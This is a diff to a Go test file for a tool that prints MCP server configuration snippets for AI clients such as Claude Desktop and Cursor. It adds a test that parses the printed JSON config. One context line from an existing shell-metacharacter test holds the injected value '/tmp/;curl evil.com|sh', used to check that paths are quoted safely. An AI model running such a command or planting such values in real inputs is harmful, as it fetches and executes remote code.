@@ -114,6 +114,48 @@ func TestPrintClaudeConfigShellMetachars(t *testing.T) {
 	assert.Contains(t, output, "'/tmp/;curl evil.com|sh'")
 }
 
+func TestPrintClaudeDesktopConfig(t *testing.T) {
+	var buf bytes.Buffer
+	err := printClaudeDesktopConfig(&buf, "/usr/local/bin/hppymcp", "/home/user/.hppycli.yaml")
+	require.NoError(t, err)
+
+	output := buf.String()
+	assert.Contains(t, output, "claude_desktop_config.json")
+	assert.Contains(t, output, "Claude Desktop")
+
+	lines := bytes.Split(buf.Bytes(), []byte("\n"))
+	var jsonBuf bytes.Buffer
+	inJSON := false
+	depth := 0
+	for _, line := range lines {
+		trimmed := bytes.TrimSpace(line)
+		if !inJSON && len(trimmed) > 0 && trimmed[0] == '{' {
+			inJSON = true
+		}
+		if inJSON {
+			jsonBuf.Write(line)
+			jsonBuf.WriteByte('\n')
+			for _, b := range trimmed {
+				if b == '{' {
+					depth++
+				} else if b == '}' {
+					depth--
+				}
+			}
+			if depth == 0 {
+				break
+			}
+		}
+	}
+	var parsed map[string]interface{}
+	require.NoError(t, json.Unmarshal(jsonBuf.Bytes(), &parsed))
+	mcpServers := parsed["mcpServers"].(map[string]interface{})
+	hppymcp := mcpServers["hppymcp"].(map[string]interface{})
+	assert.Equal(t, "/usr/local/bin/hppymcp", hppymcp["command"])
+	args := hppymcp["args"].([]interface{})
+	assert.Equal(t, []interface{}{"--config", "/home/user/.hppycli.yaml"}, args)
+}
+
 func TestPrintCursorConfig(t *testing.T) {
 	var buf bytes.Buffer
 	err := printCursorConfig(&buf, "/usr/local/bin/hppymcp", "/home/user/.hppycli.yaml")
